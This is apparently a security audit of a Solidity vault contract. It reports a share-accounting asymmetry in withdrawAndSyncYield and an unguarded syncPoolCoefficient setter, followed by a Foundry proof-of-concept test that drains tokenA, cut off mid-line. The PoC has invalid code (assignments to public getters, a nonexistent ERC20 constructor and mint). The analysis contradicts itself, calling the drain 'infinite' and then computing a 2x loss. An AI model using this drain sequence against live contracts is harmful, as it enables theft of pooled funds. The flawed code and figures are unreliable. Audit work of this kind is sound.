**VULNERABILITY TYPE & EXECUTION SEVERITY**
- **Primary Classification:** Asymmetric State Update / Integer Division Truncation leading to Unbounded Asset Drain
- **Secondary Classification:** Missing Access Control on Critical Parameter (`syncPoolCoefficient`)
- **Severity:** **CRITICAL (CVSS 4.0: 9.8/10.0)** — Direct, repeatable drainage of `tokenA` reserves via logic flaw in share accounting vs. asset transfer asymmetry. No external dependencies or complex preconditions required.

---

**COMPLETE THREAT IMPACT ANALYSIS**

**1. Core Logic Flaw: Asymmetric Scaling in `withdrawAndSyncYield`**
The function `withdrawAndSyncYield(uint256 amount)` validates user balance against the **raw, unscaled `amount`** but deducts **`scaledAmount`** from the share ledger while transferring the full **`amount`** of `tokenA`.

```solidity
// Validation uses raw amount
require(shares[msg.sender] >= amount, "INSUFFICIENT_BALANCE");

// Accounting uses scaled amount (truncated division)
uint256 scaledAmount = (amount * 10000) / poolLiquidityCoefficient;

// State Update: Burns scaledAmount shares
shares[msg.sender] -= scaledAmount;
totalShares -= scaledAmount;

// Asset Transfer: Sends raw amount
require(tokenA.transfer(msg.sender, amount), "TRANSFER_FAILED");
```

**2. Mathematical Precision Loss & Theft Vector**
Let `C = poolLiquidityCoefficient`.
- If `C > 10000`: `scaledAmount < amount`.
  - **Exploit:** Attacker calls `withdrawAndSyncYield(X)` where `X <= shares[attacker]`.
  - Contract burns `X * 10000 / C` shares but sends `X` tokens.
  - **Result:** Attacker receives `X` tokens for `X * (10000/C)` shares. **Infinite loop drain** until `shares[attacker] == 0` or `tokenA` balance exhausted. Profit factor = `C / 10000`.
- If `C < 10000`: `scaledAmount > amount`.
  - **Denial of Service / Lockup:** `shares[msg.sender] -= scaledAmount` underflows (reverts in 0.8.20) if `scaledAmount > shares[msg.sender]`, even if `shares[msg.sender] >= amount`. Legitimate users cannot withdraw full balance.
- **Truncation Theft:** Integer division `(amount * 10000) / C` floors the result. Attacker crafts `amount` such that `scaledAmount` is significantly smaller than the fair share value (e.g., `amount = 1`, `C = 20000` -> `scaledAmount = 0`, `if (scaledAmount > 0)` fails, but larger amounts allow partial burns for full transfers).

**3. Missing Access Control on `syncPoolCoefficient`**
```solidity
function syncPoolCoefficient(uint256 newCoefficient) external {
    require(newCoefficient > 0, "INVALID_COEFFICIENT");
    poolLiquidityCoefficient = newCoefficient; // MISSING: onlyOwner / onlyGovernance
}
```
- **Impact:** Any address can set `poolLiquidityCoefficient` to an arbitrary value (e.g., `20000`, `1000000`) **before** executing the withdraw exploit. This transforms a potential configuration error into a guaranteed, permissionless exploit primitive.

**4. Reentrancy Guard Bypass Irrelevance**
The `nonReentrant` modifier prevents reentrancy *during* the transfer, but the vulnerability is a **single-call logic error** (state update vs. transfer asymmetry). The guard does not mitigate the accounting mismatch.

**5. `PremiumStaking.sol` Assessment**
- `emergencyWithdraw` appears functionally correct for a basic implementation (checks-effects-interactions followed).
- **No direct exploit link** to `LiquidityVaultBridge` identified in provided scope. Isolated contract risk: Low.

---

**STEP-BY-STEP PROOF OF CONCEPT (POC) SCRIPT LOGIC**

**Scenario:** `tokenA` = USDC (6 decimals), `tokenB` = WETH. Vault holds 1,000,000 USDC. Attacker holds 10,000 shares. `poolLiquidityCoefficient` initially 10000.

**Attack Flow (Foundry/Cast Script):**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../contracts/LiquidityVaultBridge.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract ExploitPoC is Test {
    LiquidityVaultBridge vault;
    ERC20 tokenA;
    ERC20 tokenB;
    address attacker = makeAddr("attacker");
    address gov = makeAddr("gov");

    function setUp() public {
        tokenA = new ERC20("TokenA", "TKA", 18);
        tokenB = new ERC20("TokenB", "TKB", 18);
        vault = new LiquidityVaultBridge(address(tokenA), address(tokenB));

        // Setup: Mint vault liquidity & attacker shares
        tokenA.mint(address(vault), 1_000_000 ether);
        // Assume attacker acquired shares via deposit (not shown, mock state)
        vm.deal(attacker, 1 ether); // Gas
        // Direct state set for PoC brevity simulating legitimate share acquisition
        vault.shares(attacker) = 10_000 ether; 
        vault.totalShares = 10_000 ether;
    }

    function test_Exploit_AsymmetricScalingDrain() public {
        // 1. ATTACKER ESCALATES PRIVILEGE: Set malicious coefficient (No Auth Check)
        // Target: Coefficient = 20,000 (2x scale factor -> 2x drain rate)
        vm.prank(attacker);
        vault.syncPoolCoefficient(20_000); 
        assertEq(vault.poolLiquidityCoefficient(), 20_000);

        // 2. EXECUTE DRAIN LOOP
        // Attacker has 10,000 shares. Vault has 1,000,000 tokenA.
        // Loop: Withdraw max allowed by share check (raw amount = shares balance)
        // Each iteration: Burn 5,000 shares (scaled), Receive 10,000 tokens (raw).
        
        uint256 initialAttackerTokenABal = tokenA.balanceOf(attacker);
        uint256 initialVaultTokenABal = tokenA.balanceOf(address(vault));
        
        console.log("Initial Vault tokenA:", initialVaultTokenABal);
        console.log("Initial Attacker tokenA:", initialAttackerTokenABal);
        console.log("Initial Attacker Shares:", vault.shares(attacker));

        // Iteration 1: amount = 10,000 (shares balance)
        // scaledAmount = (10000 * 10000) / 20000 = 5,000
        // Transfer: 10,000 tokenA. Burn: 5,000 shares.
        vm.prank(attacker);
        vault.withdrawAndSyncYield(10_000 ether);
        
        console.log("Post-1 Shares:", vault.shares(attacker)); // 5,000
        console.log("Post-1 Attacker tokenA:", tokenA.balanceOf(attacker)); // +10,000

        // Iteration 2: amount = 5,000 (remaining shares)
        // scaledAmount = (5000 * 10000) / 20000 = 2,500
        // Transfer: 5,000 tokenA. Burn: 2,500 shares.
        vm.prank(attacker);
        vault.withdrawAndSyncYield(5_000 ether);

        // Iteration 3: amount = 2,500 ...
        vm.prank(attacker);
        vault.withdrawAndSyncYield(2_500 ether);
        
        // ... Repeat until shares ~0 or Vault empty.
        // Mathematical Limit: Attacker drains ~2x their share value in tokenA.
        // With 10k shares -> Drains ~20k tokenA (if vault has it).
        // If Coefficient = 1,000,000 -> Drains 100x share value.

        uint256 finalVaultTokenABal = tokenA.balanceOf(address(vault));
        uint256 finalAttackerTokenABal = tokenA.balanceOf